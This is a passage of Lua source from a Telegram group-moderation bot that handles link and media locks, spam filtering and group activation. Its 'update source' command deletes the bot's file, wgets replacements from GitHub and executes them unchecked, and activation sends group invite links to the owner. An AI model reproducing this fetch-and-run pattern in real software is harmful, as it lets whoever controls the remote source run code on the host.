if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Special(msg) then
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageContact' and not Special(msg) then      
if database:get(bot_id.."lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then  
local _nl, ctrl_ = string.gsub(text, '%c', '')  
local _nl, real_ = string.gsub(text, '%d', '')   
sens = 400  
if database:get(bot_id.."lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if msg.content_.ID == 'MessageSticker' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, " ◉ عذرا ← {[@"..data.username_.."]}\n ◉ عذرا تم منع الملصق \n" ) 
else
send(msg.chat_id_,0, " ◉ عذرا ← {["..data.first_name_.."](T.ME/so_alfaa )}\n ◉ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ◉ عذرا ← {[@"..data.username_.."]}\n ◉ عذرا تم منع الصوره \n" ) 
else
send(msg.chat_id_,0," ◉ عذرا ← {["..data.first_name_.."](T.ME/so_alfaa )}\n ◉ عذرا تم منع الصوره \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Manager(msg) then 
local filter = database:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ◉ عذرا ← {[@"..data.username_.."]}\n ◉ عذرا تم منع المتحركه \n") 
else
send(msg.chat_id_,0," ◉ عذرا ← {["..data.first_name_.."](T.ME/so_alfaa )}\n ◉ عذرا تم منع المتحركه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

if text == 'تفعيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' ◉ عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ◉ بالتأكيد تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n ◉ بواسطه ← ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ◉ تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' ◉ تم تفعيل جروب جديده\n'..
'\n ◉ بواسطة {'..Name..'}'..
'\n ◉ ايدي الجروب {'..IdChat..'}'..
'\n ◉ اسم الجروب {['..NameChat..']}'..
'\n ◉ عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n ◉ الرابط {['..LinkGp..']}'
if not DevSoFi(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end

if text == 'تعطيل' and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ◉ بالتأكيد تم تعطيل الجروب')
else
sendText(msg.chat_id_,'\n ◉ بواسطه ← ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ◉ تم تعطيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' ◉ تم تعطيل الجروب\n'..
'\n ◉ بواسطة {'..Name..'}'..
'\n ◉ ايدي الجروب {'..IdChat..'}'..
'\n ◉ عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n ◉ اسم الجروب {['..NameChat..']}'..
'\n ◉ الرابط {['..LinkGp..']}'
if not DevSoFi(msg) then
sendText(SUDO,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'تفعيل' and not Sudo(msg) and not database:get(bot_id..'Free:Bots') then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت \n  ◉ يرجى الاشتراك بالقناه اولا \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ عذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' ◉ عدد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'مشرف'
end
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ◉ تم تفعيل الجروب')
else
sendText(msg.chat_id_,'\n ◉ بواسطه ← ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ◉ تم تفعيل الجروب {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
database:sadd(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
Text = ' ◉ تم تفعيل جروب جديده\n'..
'\n ◉ بواسطة {'..Name..'}'..
'\n ◉ موقعه في الجروب {'..AddPy..'}' ..
'\n ◉ ايدي الجروب {'..IdChat..'}'..
'\n ◉ عدد اعضاء الجروب *{'..NumMember..'}*'..
'\n ◉ اسم الجروب {['..NameChat..']}'..
'\n ◉ الرابط {['..LinkGp..']}'
if not DevSoFi(msg) then
sendText(SUDO,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(AHMED) then  
ghhhhh:srem(AHMED.."Chek:Groups", msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success) 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp)  
local Name1 = result.first_name_ 
local Name1 = Name1:gsub('"',"")  
local Name1 = Name1:gsub("'","")  
local Name1 = Name1:gsub("","")  
local Name1 = Name1:gsub("*","")  
local Name1 = Name1:gsub("{","")  
local Name1 = Name1:gsub("}","")  
local Name = '['..Name1..'](tg://user?id='..result.id_..')' 
local NameChat = dp.title_ 
local NameChat = NameChat:gsub('"',"")  
local NameChat = NameChat:gsub("'","")  
local NameChat = NameChat:gsub("","")  
local NameChat = NameChat:gsub("*","")  
local NameChat = NameChat:gsub("{","")  
local NameChat = NameChat:gsub("}","")  
if not popppp(msg) then 
yadstt(ahmed,"◉ تم طرد البوت من جروب \n\n◉ بواسطة  {"..Name.."}\n◉ اسم الجروب {"..NameChat.."}\n◉ ايدي الجروب {"..msg.chat_id_.."} ",0,'md') 
end 
end,nil) 
end,nil) 
end
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevSoFi(msg) then
local Num = text:match("ضع عدد الاعضاء (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'Num:Add:Bot',Num) 
send(msg.chat_id_, msg.id_,' ◉ تم تعيين عدد الاعضاء سيتم تفعيل الجروبات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
if text == 'تحديث السورس' and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON11110/ALFAA/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/MADISON11110/ALFAA/main/library')
os.execute('wget https://raw.githubusercontent.com/MADISON11110/ALFAA/main/File_Bot')
send(msg.chat_id_, msg.id_,' ◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end

if text == "حاله الالعاب" and Constructor(msg) then
local MRSoOoFi = database:get(bot_id.."AL:AddS0FI:stats") or "لم يتم التحديد"
send(msg.chat_id_, msg.id_,"حاله الالعاب هي : {"..MRSoOoFi.."}\nاذا كانت {✔} الالعاب مفعله\nاذا كانت {x} الالعاب معطله")
end
if text == 'مطور' or text == 'المطور' then
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
 
 local msg_id = msg.id_/2097152/0.5
local Text = [[
اهو مطور البوت ياروحي..🥺💜
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ '..result.first_name_..'  ❩ ',url="t.me/"..result.username_}},
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/'..result.username_..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)


end
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'ياسورس'  then
local Text =[[
[♢ | 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐒𝐨𝐮𝐫𝐜𝐞 𝐀𝐥𝐟𝐚](t.me/so_alfaa)

[♢ | 𝐀𝐋𝐟𝐚 𝐓𝐡𝐞 𝐁𝐞𝐬𝐭 𝐒𝐨𝐮𝐫𝐜𝐞 𝐎𝐧 𝐓𝐞𝐥𝐞](t.me/so_alfaa)

[♢ | 𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐞 𝐁𝐮𝐭𝐭𝐨𝐧𝐬 𝐁𝐞𝐥𝐨𝐰](t.me/so_alfaa)
]]
keyboard = {} 
keyboard.inline_keyboard = {

{
